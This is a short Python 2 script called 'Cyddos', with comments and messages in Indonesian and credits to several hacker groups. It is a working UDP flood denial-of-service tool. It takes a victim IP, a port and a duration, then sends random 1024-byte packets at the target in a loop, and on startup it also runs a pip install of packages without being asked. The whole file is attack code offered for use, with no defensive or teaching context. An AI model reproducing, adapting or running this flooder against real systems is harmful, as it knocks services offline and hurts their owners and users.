"""Cyddos Author by Cyto"""
import time
import socket
import random
import sys
import os

os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored

def usage():
    print(colored("194519451945194519451945194519451945194519451945",'red'))
    print(colored("194519451945194519451945194519451945194519451945",'red'))
    print(colored("194519451945194519451945194519451945194519451945",'red'))
    print(colored("194519451945194519451945194519451945194519451945",'red'))
    print(colored("194519451945194519451945194519451945194519451945",'red'))
    print(colored("194519451945194519451945194519451945194519451945",'white'))
    print(colored("194519451945194519451945194519451945194519451945",'white'))
    print(colored("194519451945194519451945194519451945194519451945",'white'))
    print(colored("194519451945194519451945194519451945194519451945",'white'))
    print(colored("194519451945194519451945194519451945194519451945",'white'))

    print(colored("Thanks : All Member </CC4>\n", 'green'))
    print "Caranya Ketik: python2 " + sys.argv[0] + " -ip- -port- -packet-"


def flood(victim, vport, duration):
    # INI DDOS VERSI UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Thankssss yaa buat Member CC4,SORA,W3LL,INDOSEC
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Menyerang dengan %s Paket pada IP %s No.Port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

